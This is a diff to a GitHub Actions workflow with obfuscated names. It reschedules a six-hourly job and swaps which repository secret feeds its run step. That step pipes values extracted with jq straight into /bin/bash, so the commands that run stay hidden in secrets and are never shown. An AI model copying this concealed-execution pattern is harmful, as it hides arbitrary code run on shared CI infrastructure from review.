@@ -1,9 +1,8 @@
 name: changtaizhu1234
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '40 5/6 * * *'
+    - cron: '4 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,22 +10,21 @@ jobs:
       - uses: actions/checkout@v4
       - name: changtaizhu1234
         env:
-          yp0: ${{ secrets.yp0 }}
+          spr61: ${{ secrets.spr61 }}
         run: |
-          echo $yp0 | jq -r .hy4118 | /bin/bash
-          echo $fgx966 | jq -r .ffct3937 | /bin/bash
-          echo $dur469 | jq -r .fcdq97847 | /bin/bash
-          echo $rsrlv165 | jq -r .bb10084 | /bin/bash
-          echo $uen6 | jq -r .hxo308 | /bin/bash
-          echo $yl064 | jq -r .l9 | /bin/bash
-          echo $aupu1742 | jq -r .flofq7823 | /bin/bash
-          echo $niig3 | jq -r .gwdk060 | /bin/bash
-          echo $luofl77113 | jq -r .f09 | /bin/bash
-          echo $iunn6469 | jq -r .n16823 | /bin/bash
-          echo $yg3 | jq -r .zue65 | /bin/bash
-          echo $f5577 | jq -r .dxc5119 | /bin/bash
-          echo $edcx8452 | jq -r .smzj9492 | /bin/bash
-          echo $uuzq15357 | jq -r .y2792 | /bin/bash
-          echo $k995 | jq -r .p3 | /bin/bash
-          echo $bymq960 | jq -r .pup2 | /bin/bash
+          echo $spr61 | jq -r .f2 | /bin/bash
+          echo $te8 | jq -r .ujil0200 | /bin/bash
+          echo $gnjy213 | jq -r .f9956 | /bin/bash
+          echo $rhkyn98827 | jq -r .t771 | /bin/bash
+          echo $pf8 | jq -r .y99360 | /bin/bash
+          echo $juq354 | jq -r .b57 | /bin/bash
+          echo $qfle87 | jq -r .cfc68626 | /bin/bash
+          echo $kkbk82567 | jq -r .pquhb56 | /bin/bash
+          echo $wgvq83 | jq -r .vhy8264 | /bin/bash
+          echo $sje90 | jq -r .f408 | /bin/bash
+          echo $tby0213 | jq -r .lxxs07058 | /bin/bash
+          echo $cale15 | jq -r .uxn23973 | /bin/bash
+          echo $ojn52124 | jq -r .zpcx6589 | /bin/bash
+          echo $q430 | jq -r .gs98 | /bin/bash
+          echo $i1109 | jq -r .nlcm03 | /bin/bash
 
